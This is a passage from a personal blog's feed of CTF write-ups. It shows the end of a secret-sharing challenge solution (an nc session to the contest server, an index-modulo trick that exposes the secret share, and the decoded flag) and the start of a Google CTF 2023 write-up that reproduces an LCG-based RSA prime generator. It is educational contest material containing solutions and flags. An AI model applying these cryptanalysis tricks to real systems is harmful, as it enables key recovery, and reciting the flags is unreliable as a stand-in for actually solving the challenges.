&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;{i}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;.: Choose a share: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(shares[sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n])
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;we can know that this allows us to input the any number from (1 to n) including both. So in the below line simple $$%$$ operator is used to select the share among all shares. If we send &lt;code&gt;n&lt;&#x2F;code&gt; then it will become $$n mod n = 0$$, so it will select the $$0^{th}$$ share which is the flag we need.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; nc 52.59.124.14 10031
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to Sebastian&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s Secret Sharing!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;I have split my secret into 1..N=141 shares, and you need t=5 shares to recover it.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;However, I will only give you 4 shares :P
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;1.: Choose a share: 141
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(0, Decimal(&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;111370287875855598506538509804271500535681803123044982950094717&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;2.: Choose a share: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;^C
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;111370287875855598506538509804271500535681803123044982950094717&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# output
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# b&amp;#39;ENO{SeCr3t_Sh4m1r_H4sh1ng}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;I solved an easy web challenge too, look at this &lt;a href=&quot;https:&#x2F;&#x2F;xhacka.github.io&#x2F;posts&#x2F;writeup&#x2F;2023&#x2F;08&#x2F;20&#x2F;TYPicalBoss&#x2F;&quot; target=_blank&gt;blog&lt;&#x2F;a&gt; someone explained it better.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you for reading!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Google CTF 2023</title>
        <published>2023-06-26T00:00:00+00:00</published>
        <updated>2023-06-26T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/googlectf23/"/>
        <id>https://themj0ln1r.github.io/writeups/googlectf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/googlectf23/">&lt;p&gt;Hello all!
I played &lt;a href= &quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1929&quot; target=_blank&gt;Google CTF 2023&lt;&#x2F;a&gt; which was happened from  24 June to 26 June.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;crypto-least-common-genominator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-least-common-genominator&quot; aria-label=&quot;Anchor link for: crypto-least-common-genominator&quot;&gt;Crypto - LEAST COMMON GENOMINATOR?&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;googlectf23&#x2F;googlectf23_lcg.png&quot; alt=&quot;LCG&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : [generate.py,dump.txt,flag.txt,public.pem]&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;generate.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;config
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;PublicKey &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;RSA
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;bytes_to_long&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;isPrime
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;LCG&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;c
&lt;&#x2F;span&gt;&lt;span&gt;    lcg_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;lcg_s&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lcg_s
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_c) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;lcg_n
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;state
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;__main__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4096 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;it &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;it &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4096 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bits &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bits &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;512
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Find prime value of specified bits a specified amount of times
&lt;&#x2F;span&gt;&lt;span&gt;    seed &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
&lt;&#x2F;span&gt;&lt;span&gt;    lcg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;LCG&lt;&#x2F;span&gt;&lt;span&gt;(seed)
&lt;&#x2F;span&gt;&lt;span&gt;    primes_arr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    dump &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;    items &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    dump_file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;dump.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;w&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;it):
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                prime_candidate &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;lcg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;dump:
&lt;&#x2F;span&gt;&lt;span&gt;                    dump_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(prime_candidate) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                    items &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;items &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                        dump &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;                        dump_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isPrime&lt;&#x2F;span&gt;&lt;span&gt;(prime_candidate):
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;prime_candidate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bits:
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;prime_candidate
&lt;&#x2F;span&gt;&lt;span&gt;                    primes_arr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(prime_candidate)
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check bit length
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;primes_n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;bit length&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;primes_n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            primes_arr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;clear&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            primes_n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Create public key &amp;#39;n&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;    n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;primes_arr:
&lt;&#x2F;span&gt;&lt;span&gt;        n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span&gt;j
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[+] Public Key: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n)
